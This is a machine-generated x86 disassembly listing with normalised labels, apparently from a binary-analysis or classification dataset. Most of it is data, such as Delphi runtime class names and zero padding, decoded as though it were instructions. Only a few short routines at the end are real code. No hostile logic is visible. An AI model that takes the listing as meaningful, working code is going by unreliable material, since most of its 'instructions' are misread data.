sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 2 + 0x40 ] al
add [ eax ] dl
add [ eax ] al
add [ ebp + ebp * 2 + 0x33200040 ] bl
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ ebx + esi * 4 + 0x40 ] cl
outsd
outsb
call sub_40ae0e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
insd
inc eax
add [ eax ] dl
add [ eax ] al
add [ ebp * 2 + 0x33200040 ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ ebx + esi * 4 + 0x40 ] cl
add al ah
xor [ eax ] al
push cs
inc ebp
dec eax
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
dec edi
dec bp
insd
outsd
jb r-xdata
add al ah
xor [ eax ] al
or al 0x45
dec edi
jne r-xdata
sub [ ebx ] dh
inc eax
add [ eax + 0x4c004030 ] cl
mov bl 0x40
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000406f ] dh
jb r-xdata
outsb
inc eax
add [ eax ] dl
add [ eax ] al
add [ ebp * 2 + 0x33200040 ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx ] cl
inc ebp
inc ebp
js r-xdata
add [ eax ] al
clc
lea eax [ eax ]
mov al [ 0x406e ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000406e ] ah
jo r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
jb r-xdata
add [ eax ] al
add [ esi + ebp * 2 + 0x33200040 ] ch
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx ] cl
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x6f
inc eax
add [ eax ] dl
popad
insb
mov eax eax
push eax
outsd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6f ] dl
inc ebp
jb r-xdata
add [ eax ] al
add [ ebp * 2 + 0x33200040 ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] cl
inc ebp
dec ecx
outsb
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x1000406e ]
imul ebp [ edi + 0x6e ] 0x406e4490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
inc eax
add [ edx ] cl
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
pushad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jo r-xdata
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ esi + ebp * 2 + 0x33200040 ] ch
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
outsd
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax + esi + 0x30e00040 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004070 ] bh
add [ eax ] dl
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] ah
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] dl
inc ebp
inc ebp
js r-xdata
ror [ eax ] 0x70
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] ah
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
jne r-xdata
outsb
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esi [ ecx + 0x40 ]
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70 ] ah
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x40 ] ch
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] bl
inc eax
add [ eax ] dl
add [ eax ] al
add al cl
jo r-xdata
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
jno r-xdata
outsd
jb r-xdata
add [ eax + esi + 0x30e00040 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jno r-xdata
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + 0x40 ] dh
imul ebp [ edi + 0x6e ] 0x406fb090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x40 ] dh
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
add [ eax ] al
inc esp
imul esi [ esi + 0x69 ] 0x721c6564
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al cl
jo r-xdata
movsb [ edi ] [ esi ]
xor [ eax ] al
loopne r-xdata
insb
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x4071c490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al cl
jo r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ esi + ebp * 2 + 0x33200040 ] ch
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] cl
inc ebp
dec ebp
popad
je r-xdata
inc eax
add [ ecx + esi * 2 ] dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
jb r-xdata
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] cl
inc ebp
push ebp
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
jb r-xdata
add [ eax ] al
adc al 0x71
inc eax
add [ eax * 2 + 0x4f746e49 ] cl
jbe r-xdata
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] ah
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
inc eax
add [ eax ] dl
inc eax
add [ ebx ] cl
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
jae r-xdata
add [ eax ] dl
add [ eax ] al
add [ ebp + ebp * 2 + 0x33200040 ] bl
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ ebx + esi * 4 + 0x40 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebx + 0x40 ] dh
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
outsd
ja r-xdata
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ 0x6e6f4345 ] cl
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0xc0040 ] al
add [ eax + eax ] cl
add [ eax ] al
xor al 0x6d
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
outsb
lea eax [ eax ]
inc eax
je r-xdata
jb r-xdata
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx ] cl
inc ebp
dec edi
jbe r-xdata
int3
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] cl
inc ebp
pop edx
jb r-xdata
shl [ edx + esi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
jae r-xdata
lea eax [ eax ]
test [ ebx + 0x40 ] dh
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
insd
jae r-xdata
add [ eax + esi + 0x30e00040 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74 ] al
inc eax
inc ebp
jb r-xdata
add al ah
xor [ eax ] al
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
sub [ ebx ] dh
inc eax
add [ eax + 0x4c004030 ] cl
mov bl 0x40
add [ eax ] dl
add [ eax ] al
add al cl
jo r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ esi + ebp * 2 + 0x33200040 ] ch
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax ] dl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax * 2 + 0x61766e49 ] cl
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ ebx + esi * 2 + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx + 0x40 ] dh
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
je r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004074 ] bl
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
insb
nop
cwde
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ esi + ebp * 2 + 0x33200040 ] ch
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
inc eax
shl al 0x73
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
dec esp
jne r-xdata
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ esi ] cl
inc ebp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ 0x72615645 ] cl
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] cl
jb r-xdata
inc eax
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
shr [ eax + 0x4075 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x75
inc eax
add [ eax + eax ] cl
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
jne r-xdata
insb
outsd
ja r-xdata
add [ eax + eax ] cl
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
inc eax
inc eax
add [ ecx ] cl
inc ebp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax ] dl
inc ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
xor [ eax ] al
loopne r-xdata
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004075 ] ch
add [ eax ] al
add [ ebp * 2 + 0x33200040 ] dh
inc eax
add [ ebx + esi ] ch
outsd
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
or [ esi + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jbe r-xdata
add [ eax ] al
add [ esi + ebp * 2 + 0x33200040 ] ch
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
inc eax
add [ eax ] dl
inc eax
add [ edx ] cl
inc ebp
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ ebp * 2 + 0x33200040 ] dh
inc eax
add [ ebx + esi ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x40 ] ah
add [ eax + eax ] cl
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi + 0x40 ] dh
inc ebp
jb r-xdata
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add ah cl
ja r-xdata
je r-xdata
sub [ ebx ] dh
inc eax
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
and al 0xc7
push ebp
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
inc eax
add [ eax ] bl
ja r-xdata
add [ eax ] al
add [ eax ] al
int3
imul ebp [ edi + 0x6e ] 0x40773090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
ja r-xdata
loopne r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax ] cl
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
shl [ esi + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
jbe r-xdata
jb r-xdata
aam 0xe9
push edi
push edx
add [ eax ] al
add eax 0xffffffd4
jmp sub_40caac
inc eax
add [ ebx ] dl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
add [ eax + eax ] al
add [ eax + 0x20004010 ] ah
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
insb
jae r-xdata
loopne r-xdata
je r-xdata
add [ eax ] al
shl [ esi + 0x40 ] 0x0
adc [ eax ] al
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ esi ] cl
inc ebp
dec ecx
outsb
je r-xdata
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
inc eax
add [ esi ] cl
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
jae r-xdata
adc [ ebp + 0x41 ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ edi + esi * 2 + 0x40 ] 0x0
adc [ ebx ] eax
cmp [ cs : esp + eax ] dh
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x4078203f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x78
inc eax
add [ eax + edi * 2 ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x30004078 ] ch
add [ eax ] al
add [ ecx + edx + 0x33200040 ] dl
inc eax
add [ eax + 0x55 ] ch
inc eax
add [ ebp + edx * 2 + 0x40 ] dh
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
test [ ebp + 0x40 ] dl
add [ eax + esi - 0x3737ffc0 ] ah
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
jb r-xdata
add [ eax + esi + 0x30e00040 ] ah
add [ eax ] al
add [ eax ] al
add [ eax + esi - 0x38dbffc0 ] ah
je r-xdata
adc [ ecx + 0x46613415 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
je r-xdata
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
add eax 0xffffffd4
jmp sub_40ca40
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
lodsd [ esi ]
push edx
popad
inc ebp
js r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
sar bh 0xff
insb
jne r-xdata
retn
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
add [ ebx + 0x4675b415 ] cl
add [ ebx + 0xa890448 ] cl
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
xor al 0x61
inc esi
add [ ebx + 0x34158910 ] cl
popad
inc esi
arpl [ eax + 0x72 ] bp
outsd
sub_407284
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_407784
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_4078d0
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_4078ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
